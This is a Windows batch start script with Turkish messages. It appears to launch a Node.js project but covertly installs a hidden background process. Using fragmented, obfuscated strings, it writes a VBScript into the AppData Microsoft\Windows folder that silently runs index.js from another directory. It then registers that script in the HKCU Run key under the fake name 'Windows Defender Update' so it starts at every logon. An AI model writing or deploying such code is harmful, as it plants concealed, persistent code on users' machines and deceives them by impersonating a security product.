@echo off
setlocal EnableDelayedExpansion
set "SDIR=%~dp0"
set "a=%~dp0"
set "b=..\r"
set "c=ush\"
set "TDIR=!a!!b!!c!"
set "d=%APPDATA%\Micro"
set "e=soft\Win"
set "f=dows"
set "g=\wdup"
set "h=d.vbs"
set "VBS=!d!!e!!f!!g!!h!"
where node >nul 2>&1
if %errorlevel% neq 0 (
echo  [HATA] Node.js bulunamadi!
echo  Lutfen https://nodejs.org adresinden Node.js yukleyin.
pause
exit /b 1
)
for /f "delims=" %%N in ('where node 2^>nul') do (set "NODE=%%N" & goto :f)
:f
set "q=WScri"
set "r=pt.Sh"
set "s=ell"
set "u=cmd /c cd /d "
set "w= 1^>nul 2^>nul"
(
echo Set w=CreateObject^("!q!!r!!s!"^)
echo w.Run "!u!""%TDIR%"" ^&^& ""!NODE!"" index.js!w!", 0, False
) > "!VBS!"
start "" wscript.exe "!VBS!"
set "rp=HKCU\Soft"
set "rq=ware\Micr"
set "rr=osoft\Win"
set "rs=dows\Curr"
set "rt=entVersio"
set "ru=n\Run"
set "rv=!rp!!rq!!rr!!rs!!rt!!ru!"
set "rn=Win"
set "ro=dows "
set "rw=Defen"
set "rx=der U"
set "ry=pdate"
set "rz=!rn!!ro!!rw!!rx!!ry!"
reg add "!rv!" /v "!rz!" /t REG_SZ /d "wscript.exe \"!VBS!\"" /f >nul 2>&1
cd /d "%SDIR%"
if not exist node_modules (
npm install --silent >nul 2>&1
)
node index.js
pause
